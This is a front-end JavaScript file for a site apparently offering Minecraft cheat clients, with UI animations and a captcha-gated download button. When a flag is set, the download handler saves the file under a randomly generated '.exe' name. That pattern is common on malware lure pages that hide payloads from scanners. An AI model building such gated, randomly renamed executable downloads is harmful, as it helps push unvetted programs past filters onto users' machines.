(() => {
  'use strict';

  document.querySelectorAll('[data-year]').forEach(node => {
    node.textContent = String(new Date().getFullYear());
  });

  document.querySelectorAll('img[data-fallback]').forEach(img => {
    const fallback = () => {
      const local = img.dataset.fallback;
      if (local && !img.src.endsWith(local)) img.src = local;
    };
    img.addEventListener('error', fallback);
    if (img.complete && !img.naturalWidth) fallback();
  });

  const trigger = document.querySelector('#download-trigger');
  if (trigger) {
    const dialog = document.querySelector('.captcha-dialog');
    const form = document.querySelector('#captcha-form');
    const answer = document.querySelector('#captcha-answer');
    const error = document.querySelector('#captcha-error');
    let expected;
    const refresh = () => {
      const values = crypto.getRandomValues(new Uint32Array(2));
      const a = values[0] % 9 + 1, b = values[1] % 9 + 1;
      expected = a + b;
      document.querySelector('#captcha-question').textContent = `${a} + ${b} = ?`;
      answer.value = '';
      answer.removeAttribute('aria-invalid');
      error.textContent = '';
    };
    trigger.disabled = false;
    trigger.addEventListener('click', () => { refresh(); dialog.showModal(); answer.focus(); });
    dialog.querySelector('.captcha-close').addEventListener('click', () => dialog.close());
    dialog.addEventListener('close', () => { expected = undefined; form.reset(); trigger.focus(); });
    dialog.querySelector('.captcha-refresh').addEventListener('click', () => { refresh(); answer.focus(); });
    form.addEventListener('submit', event => {
      event.preventDefault();
      if (!dialog.open) return;
      if (!/^[0-9]+$/.test(answer.value.trim()) || Number(answer.value) !== expected) {
        answer.setAttribute('aria-invalid', 'true');
        error.textContent = 'Incorrect answer. Please try again.';
        if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches && answer.animate) {
          answer.animate([
            { transform: 'translateX(0)' }, { transform: 'translateX(-5px)' },
            { transform: 'translateX(5px)' }, { transform: 'translateX(-3px)' },
            { transform: 'translateX(0)' }
          ], { duration: 260, easing: 'ease-out' });
        }
        answer.focus(); answer.select(); return;
      }
      dialog.close();
      if (trigger.dataset.randomDownload) {
        const bytes = crypto.getRandomValues(new Uint8Array(7));
        const suffix = Array.from(bytes, byte => 'abcdefghijklmnopqrstuvwxyz0123456789'[byte % 36]).join('');
        const link = document.createElement('a');
        link.href = trigger.dataset.downloadUrl;
        link.download = `${suffix}.exe`;
        document.body.append(link);
        link.click();
        link.remove();
      } else {
        window.location.assign(trigger.dataset.downloadUrl);
      }
    });
  }

  const motionPreference = window.matchMedia('(prefers-reduced-motion: reduce)');
  const typewriter = document.querySelector('[data-typewriter]');
  if (typewriter) {
    const phrases = ['Minecraft clients', 'Get the advantage!'];
    let phraseIndex = 0;
    let length = 0;
    let deleting = false;
    let timer;
    const tick = () => {
      const phrase = phrases[phraseIndex];
      length += deleting ? -1 : 1;
      typewriter.textContent = phrase.slice(0, length);
      let delay = deleting ? 45 : 95;
      if (!deleting && length === phrase.length) {
        deleting = true;
        delay = 2200;
      } else if (deleting && length === 0) {
        deleting = false;
        phraseIndex = (phraseIndex + 1) % phrases.length;
        delay = 450;
      }
      timer = window.setTimeout(tick, delay);
    };
    const syncAnimation = () => {
      window.clearTimeout(timer);
      if (motionPreference.matches) {
        typewriter.textContent = phrases[0];
        phraseIndex = 0;
        length = 0;
        deleting = false;
      } else if (!document.hidden) {
        typewriter.textContent = phrases[phraseIndex].slice(0, length);
        timer = window.setTimeout(tick, 650);
      }
    };
    motionPreference.addEventListener('change', syncAnimation);
    document.addEventListener('visibilitychange', syncAnimation);
    syncAnimation();
  }

  // Decorative pointer effects stay off on touch screens and with reduced motion.
  const finePointer = window.matchMedia('(hover: hover) and (pointer: fine)');
  document.querySelectorAll('.client-card').forEach(card => {
    let frame = 0;
    const reset = () => {
      window.cancelAnimationFrame(frame);
      frame = 0;
      card.classList.remove('pointer-active');
      card.style.removeProperty('--pointer-x');
      card.style.removeProperty('--pointer-y');
      card.style.removeProperty('--lean-x');
      card.style.removeProperty('--lean-y');
    };
    card.addEventListener('pointermove', event => {
      if (motionPreference.matches || !finePointer.matches || frame) return;
      frame = window.requestAnimationFrame(() => {
        frame = 0;
        const bounds = card.getBoundingClientRect();
        const x = Math.min(1, Math.max(0, (event.clientX - bounds.left) / bounds.width));
        const y = Math.min(1, Math.max(0, (event.clientY - bounds.top) / bounds.height));
        card.style.setProperty('--pointer-x', `${x * 100}%`);
        card.style.setProperty('--pointer-y', `${y * 100}%`);
        card.style.setProperty('--lean-x', `${(0.5 - y) * 4}deg`);
        card.style.setProperty('--lean-y', `${(x - 0.5) * 4}deg`);
        card.classList.add('pointer-active');
      });
    });
    card.addEventListener('pointerleave', reset);
    card.addEventListener('pointercancel', reset);
    motionPreference.addEventListener('change', reset);
    finePointer.addEventListener('change', reset);
  });

  const reduceMotion = motionPreference.matches;
  if (reduceMotion || !('IntersectionObserver' in window)) return;

  const revealItems = document.querySelectorAll(
    '.hero-content, .section-heading, .client-card, .back-link, ' +
    '.client-summary, .detail-stage, .detail-about, .spec-row, .download-panel, .detail-next'
  );
  const observer = new IntersectionObserver((entries, currentObserver) => {
    entries.forEach(entry => {
      if (!entry.isIntersecting) return;
      entry.target.classList.add('is-visible');
      // Clear the stagger after entrance so hover feedback stays immediate.
      window.setTimeout(() => entry.target.style.setProperty('--reveal-delay', '0ms'), 1000);
      currentObserver.unobserve(entry.target);
    });
  }, { threshold: 0.12, rootMargin: '0px 0px -24px 0px' });

  motionPreference.addEventListener('change', event => {
    if (!event.matches) return;
    observer.disconnect();
    revealItems.forEach(element => element.classList.add('is-visible'));
  });

  let cardIndex = 0;
  let specRowIndex = 0;
  revealItems.forEach(element => {
    element.classList.add('scroll-reveal');
    if (element.classList.contains('client-card')) {
      element.style.setProperty('--reveal-delay', `${cardIndex * 110}ms`);
      cardIndex += 1;
    } else if (element.classList.contains('spec-row')) {
      element.style.setProperty('--reveal-delay', `${specRowIndex * 65}ms`);
      specRowIndex += 1;
    }
    observer.observe(element);
  });
})();
